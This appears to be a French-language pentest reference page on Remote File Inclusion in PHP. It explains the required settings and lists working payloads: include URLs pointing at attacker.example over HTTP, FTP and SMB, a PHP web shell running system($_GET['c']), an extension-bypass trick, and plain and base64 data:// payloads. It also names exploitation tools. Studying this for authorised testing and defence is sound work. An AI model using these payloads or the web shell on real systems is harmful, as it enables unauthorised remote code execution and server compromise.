---
title: "Inclusion de fichiers distante : exécuter du code hébergé par l'attaquant"
description: "Le RFI pointe un sink d'inclusion vers une URL contrôlée par l'attaquant de sorte que l'interpréteur récupère et exécute du code externe, conditionné par allow_url_include et allow_url_fopen."
keywords:
  - inclusion de fichiers distante
  - RFI
  - allow_url_include
  - allow_url_fopen
  - wrapper data
  - include php
---

# Remote

L'inclusion de fichiers distante survient lorsqu'un sink include/require accepte une URL complète, de sorte que l'interpréteur récupère du code depuis un hôte contrôlé par l'attaquant et l'exécute dans le contexte de l'application. C'est le chemin inclusion-vers-RCE le plus direct, car aucune écriture locale ni étape d'empoisonnement n'est nécessaire.

## La condition

En PHP, l'inclusion distante requiert `allow_url_include = On` (et, pour le fetch, `allow_url_fopen = On`). Les deux valent `Off` par défaut dans les versions modernes, donc le RFI se trouve surtout sur des stacks héritées ou délibérément mal configurées. Là où le paramètre est activé, un sink comme `include($_GET['page'])` charge n'importe quelle URL que vous fournissez.

## Inclusion HTTP

Hébergez un payload et pointez le sink dessus. Le fichier distant doit contenir du PHP brut ; empêchez le gestionnaire de l'exécuter localement en le servant en texte brut ou en utilisant une extension que votre propre serveur n'exécute pas :

```
?page=http://attacker.example/shell.txt
```

`shell.txt` :

```php
<?php system($_GET['c']); ?>
```

Puis pilotez-le :

```
?page=http://attacker.example/shell.txt&c=id
```

Un `?` à la fin de l'URL de l'attaquant avale toute extension que l'application ajoute, de sorte que `include($_GET['page'].'.php')` récupère `shell.txt?` et ignore le `.php` :

```
?page=http://attacker.example/shell.txt?
```

## FTP et autres schémas

Lorsque le HTTP sortant est filtré mais que d'autres fetchers sont autorisés, le wrapper FTP joue le même rôle :

```
?page=ftp://attacker.example/shell.txt
```

Les chemins SMB (`\\attacker\share\shell.php`) peuvent fonctionner contre des cibles Windows/PHP, et font double emploi comme vecteur de capture de hash NTLM lorsque le serveur s'authentifie auprès de votre listener.

## data:// comme RFI autonome

Avec `allow_url_include` activé, le wrapper `data://` transporte le code dans la requête elle-même, sans aucun hôte externe :

```
?page=data://text/plain,<?php system($_GET['c']); ?>
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==
```

C'est pratique lorsque la cible ne peut pas joindre votre infrastructure mais honore tout de même les inclusions d'URL.

## Au-delà de PHP

La même forme apparaît dans d'autres écosystèmes chaque fois qu'un moteur de modèle ou un chargeur de module prend un emplacement distant : moteurs de templates côté serveur qui récupèrent des includes via HTTP, chargeurs de ressources JSP/JSF, et chargeurs Node qui font `require` d'un chemin construit dynamiquement. Le pivot est identique, rediriger le chargeur vers du code contrôlé par l'attaquant, et le langage du payload suit la plateforme.

## Outils

- **[fimap](https://github.com/kurobeats/fimap)** : exploitation automatisée d'inclusion de fichiers distante et locale.
- **[kadimus](https://github.com/P0cL4bs/Kadimus)** : détection et exploitation de RFI et LFI.
- **[Burp Suite](https://portswigger.net/burp)** : Repeater pour pointer le sink vers du code hébergé par l'attaquant.

## Références

- [OWASP: Testing for Remote File Inclusion](https://owasp.org/www-project-web-security-testing-guide/)
- [PayloadsAllTheThings: File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
